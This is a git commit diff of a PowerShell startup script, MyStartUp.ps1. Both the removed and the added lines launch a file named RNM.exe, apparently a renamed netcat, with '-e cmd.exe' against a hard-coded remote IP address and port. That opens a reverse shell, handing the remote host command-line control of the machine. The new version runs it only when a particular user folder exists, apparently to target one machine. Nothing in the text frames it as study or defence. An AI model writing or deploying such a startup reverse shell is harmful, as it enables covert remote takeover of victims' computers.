a0ef7cc91ced1d07508a2e4984c65b8ea1b6b807
fullcaleta <144293848+fullcaleta@users.noreply.github.com>
2024-04-21 12:13:18 -0400

    Update MyStartUp.ps1

--- MyStartUp.ps1
+++ MyStartUp.ps1
@@ -1,1 +1,5 @@
-C:\Users\Public\RNM.exe -nv 193.161.193.99 37515 -e cmd.exe
+if (-not (Test-Path "C:\Users\alooo")) {
+    Write-Host "No"
+} else {
+    Start-Process -FilePath "C:\Users\Public\RNM.exe" -ArgumentList "-nv", "193.161.193.99", "37515", "-e", "cmd.exe"
+}
